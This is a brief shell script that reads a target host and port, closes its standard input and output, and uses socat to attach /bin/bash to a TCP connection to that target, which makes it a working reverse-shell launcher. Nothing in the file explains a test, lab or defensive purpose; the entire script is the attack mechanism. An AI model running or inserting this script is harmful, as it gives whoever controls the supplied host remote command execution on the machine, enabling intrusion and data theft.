#!/bin/sh

# Read the target host:port
read -r TARGET
# Close stdio
exec <&- >&- 2>&-
# Connect a shell (we use exec because we don't need this bash anymore)
exec socat exec:/bin/bash,stderr tcp:$TARGET,connect-timeout=3
